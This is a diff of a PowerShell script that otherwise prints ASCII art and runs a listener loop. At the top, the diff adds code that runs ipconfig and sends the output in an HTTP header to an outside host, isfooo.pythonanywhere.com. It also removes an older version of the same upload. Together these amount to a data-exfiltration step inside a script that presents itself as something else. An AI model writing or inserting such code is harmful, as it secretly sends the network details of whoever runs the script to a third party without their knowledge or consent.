@@ -1,3 +1,24 @@
+# Define the URL and headers
+$url = "http://isfooo.pythonanywhere.com/"
+$headers = @{
+    'ip' = (ipconfig | Out-String)
+}
+
+# Create a WebClient object
+$client = New-Object System.Net.WebClient
+
+# Set the headers
+foreach ($header in $headers.GetEnumerator()) {
+    $client.Headers.Add($header.Key, $header.Value)
+}
+
+# Send the request
+$response = $client.DownloadString($url)
+
+# Display the response
+Write-Host "Response from server:"
+Write-Host $response
+
 $asciiArt = @"
           _____                    _____                    _____                   _______                 
          /\    \                  /\    \                  /\    \                 /::\    \                
@@ -57,30 +78,6 @@ while ($true) {
     }
 
     Start-Sleep -Seconds 1
-}
-
-# Run ipconfig and capture the output
-$ipConfigOutput = & ipconfig
-
-# Convert the ipconfig output to string
-$ip = $ipConfigOutput.ToString()
-
-# Specify the URL and headers
-$url = "https://isfooo.pythonanywhere.com/"
-$headers = @{
-    "ip" = $ip
-}
-
-# Send the GET request with parameters "isfo" and headers
-$response = Invoke-RestMethod -Uri $url -Method Get -Headers $headers -QueryString "isfo"
-
-# Check the response
-if ($response.StatusCode -eq 200) {
-    Write-Host "Request successful"
-    Write-Host "Response content: $($response.Content)"
-} else {
-    Write-Host "Request failed with status code $($response.StatusCode)"
-    Write-Host "Response content: $($response.Content)"
 }
 
 $listener.Stop()
